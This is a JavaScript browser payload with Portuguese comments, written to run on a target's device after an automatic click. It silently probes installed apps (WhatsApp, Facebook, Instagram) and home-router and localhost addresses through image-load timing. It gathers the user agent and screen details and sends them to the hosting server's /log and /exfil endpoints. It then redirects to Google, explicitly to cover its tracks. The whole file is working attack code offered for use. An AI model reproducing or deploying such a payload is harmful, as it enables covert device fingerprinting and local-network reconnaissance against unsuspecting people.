// payload.js
// Script executado no navegador do dispositivo alvo após o clique automático.

const EXFIL_SERVER = window.location.origin; // O servidor que hospeda esta página

/**
 * Função principal para iniciar a exploração.
 */
function startExploitation() {
    console.log("Payload.js carregado. Iniciando exploração não-intrusiva...");

    // 1. Tentativa de Exfiltração de Dados de Rede Local (Side-Channel Attack)
    // O navegador moderno impede o acesso direto a arquivos locais (file://)
    // Mas podemos tentar acessar recursos na rede local (LAN) do celular.
    // O objetivo é tentar carregar imagens ou scripts de URLs internas comuns
    // e usar o tempo de resposta (timing attack) ou o sucesso/falha do carregamento
    // para inferir informações sobre a rede ou o dispositivo.
    
    // Vetores de ataque de Side-Channel (Timing Attack/Image Load)
    const local_paths_to_test = [
        // Tentativa de acesso a recursos de apps comuns (ex: Android/iOS custom URL schemes)
        "whatsapp://send?text=test", // Tenta abrir o WhatsApp (se instalado)
        "fb://profile", // Tenta abrir o Facebook (se instalado)
        "instagram://user?username=test", // Tenta abrir o Instagram (se instalado)
        
        // Tentativa de acesso a recursos de rede local (LAN)
        "http://192.168.1.1/router_config.html", // Roteador comum
        "http://10.0.0.1/admin", // Outro roteador comum
        "http://localhost:8080/data", // Algum serviço local
        "http://127.0.0.1:8080/data"
    ];

    let exfiltrated_info = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screen: {
            width: screen.width,
            height: screen.height,
            pixelRatio: window.devicePixelRatio
        },
        networkInfo: []
    };

    let attempts_completed = 0;
    const total_attempts = local_paths_to_test.length;

    local_paths_to_test.forEach(path => {
        const img = new Image();
        const startTime = performance.now();

        img.onload = function() {
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            // Se carregar, é um sucesso e um recurso local foi acessado.
            const log_entry = { path: path, status: "SUCCESS", duration: duration.toFixed(2) + "ms" };
            exfiltrated_info.networkInfo.push(log_entry);
            logAttempt(path, "SUCCESS");
            checkCompletion();
        };

        img.onerror = function() {
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            // Se falhar, pode ser bloqueio do navegador ou recurso inexistente.
            const log_entry = { path: path, status: "FAILURE", duration: duration.toFixed(2) + "ms" };
            exfiltrated_info.networkInfo.push(log_entry);
            logAttempt(path, "FAILURE");
            checkCompletion();
        };

        // Tenta carregar o recurso como uma imagem (Cross-Origin Request)
        // O navegador tentará carregar, e o sucesso/falha será detectado.
        img.src = path;
    });

    /**
     * Envia o log de tentativa para o servidor (Side-Channel).
     * @param {string} path - O caminho que foi testado.
     * @param {string} status - O status da tentativa (SUCCESS/FAILURE).
     */
    function logAttempt(path, status) {
        const logUrl = `${EXFIL_SERVER}/log?path=${encodeURIComponent(path)}&status=${status}`;
        fetch(logUrl).catch(e => console.error("Erro ao logar tentativa:", e));
    }

    /**
     * Verifica se todas as tentativas foram concluídas e inicia a exfiltração final.
     */
    function checkCompletion() {
        attempts_completed++;
        if (attempts_completed === total_attempts) {
            console.log("Todas as tentativas de Side-Channel concluídas. Exfiltrando dados...");
            // 2. Exfiltração Final dos Dados Coletados
            exfiltrateData(exfiltrated_info);
        }
    }
}

/**
 * Envia os dados coletados para o servidor de exfiltração.
 * @param {object} data - O objeto de dados a ser exfiltrado.
 */
function exfiltrateData(data) {
    const jsonString = JSON.stringify(data);
    // Usamos o endpoint /exfil e passamos o JSON como um parâmetro de query
    const exfilUrl = `${EXFIL_SERVER}/exfil?data=${encodeURIComponent(jsonString)}`;
    
    // Faz a requisição final para o servidor
    fetch(exfilUrl)
        .then(response => {
            console.log("Exfiltração de dados concluída com sucesso.");
            // Redireciona para uma página neutra para não deixar rastros
            setTimeout(() => {
                window.location.replace("https://www.google.com");
            }, 1000);
        })
        .catch(error => {
            console.error("Erro durante a exfiltração:", error);
            // Redireciona mesmo em caso de erro
            setTimeout(() => {
                window.location.replace("https://www.google.com");
            }, 1000);
        });
}

// Inicia a exploração quando o DOM estiver pronto
document.addEventListener("DOMContentLoaded", startExploitation);
